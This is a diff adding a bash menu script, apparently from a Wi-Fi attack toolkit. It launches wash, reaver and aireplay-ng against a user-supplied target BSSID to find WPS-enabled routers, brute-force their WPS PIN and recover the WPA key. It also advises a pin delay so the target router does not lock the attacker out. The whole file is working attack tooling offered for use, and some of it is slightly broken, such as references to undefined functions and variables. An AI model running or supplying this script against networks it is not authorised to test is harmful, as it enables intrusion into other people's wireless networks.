@@ -1,0 +1,130 @@
+#! /bin/bash
+function reaver_wpastart
+{
+	reaver -i wlan0mon -b $BSSIDT -p $WPST -vv
+	echo -e "Press any key to continue..."
+	read
+}
+function associate_aireplay
+{
+	echo -e "Enter your target's BSSID: "
+	read -e BSSIDT
+	export BSSIDT
+	export -f aireplay_command
+	xterm -e bash -c 'aireplay_command; exec bash'
+	clear
+	exec bash "$0"
+}
+echo -e "-------------------------Finding WPS pin-------------------------"
+echo -e " 1) Scan with wash"
+echo -e " 2) Reaver"
+echo -e " 3) Reaver (if you already have the WPS pin)"
+echo -e " 4) Association with aireplay"
+echo -e " 0) EXIT"
+read -e YN
+if [ "$YN" = "1" ]
+then
+	echo -e "Scaning in new terminal..."
+	sleep 1
+	gnome-terminal -x sh -c "wash -i wlan0mon; bash"
+	#gnome-terminal -e 'wash -i wlan0mon'
+	#xterm -e bash -c 'wash -i wlan0mon; exec bash'
+	echo -e "Start reaver?(y/n)(Enter=yes): "
+	read YNN
+	if [ "$YNN" = "n" ]
+	then
+		clear
+		exec bash "$0"
+	else
+	#reaver_fill
+	echo -e "Enter your target's BSSID: "
+	read -e BSSIDT
+	echo -e "Enter your target's channel: "
+	read -e CHANT
+	echo -e "Enter the delay of every pin(WARNING: Put 30.The router may block you otherwise.): "
+	read -e DELT
+	export BSSIDT
+	export CHANT
+	export DELT
+	echo -e "Starting reaver in a new terminal"
+	sleep 1
+	GLV="2"
+	export GLV
+	gnome-terminal -e lh31
+	clear
+	exec bash "$0"
+
+	fi
+elif [ "$YN" = "2" ]
+then
+	#~ reaver_fill
+	echo -e "Enter your target's BSSID: "
+	read -e BSSIDT
+	echo -e "Enter your target's channel: "
+	read -e CHANT
+	echo -e "Enter the delay of every pin(WARNING: Put 30.The router may block you otherwise.): "
+	read -e DELT
+	export BSSIDT
+	export CHANT
+	export DELT
+	echo -e "Starting reaver in a new terminal"
+	sleep 1
+	GLV="2"
+	export GLV
+	gnome-terminal -e lh31	
+	clear
+	exec bash "$0"
+elif [ "$YN" = "3" ]
+then
+	#~ reaver_wpa
+	echo -e "Enter your target's BSSID: "
+	read -e BSSIDT
+	echo -e "Enter your target's WPS pin: "
+	read -e WPST
+	export BSSIDT
+	export WPST
+	export reaver_wpastart
+	echo -e "Starting reaver in a new terminal"
+	sleep 1
+	GLV="3"
+	export GLV
+	gnome-terminal -e lh31
+	clear
+	exec bash "$0"
+elif [ "$YN" = "4" ]
+then
+	echo -e "Enter your target's BSSID: "
+	read -e BSSIDT
+	export BSSIDT
+	export -f aireplay_command
+	xterm -e bash -c 'aireplay-ng -1 0 -a $BSSIDT wlan0mon; exec bash'
+	clear
+	exec bash "$0"
+elif [ "$YN" = "0" ]
+then
+	exit
+fi
+echo -e "Choose again?(y/n)(Enter=yes): "
+read -e BB
+if [ -z "$BB" ]
+then
+	if [ "$AA" = "1" ]
+		then
+		exec bash "$0"
+	else
+		clear
+		exec bash "$0"
+	fi
+elif [ "$BB" = "y" ]
+then
+	if [ "$AA" = "1" ]
+		then
+		exec bash "$0"
+	else
+		clear
+		exec bash "$0"
+	fi
+else
+	clear
+	exit
+fi
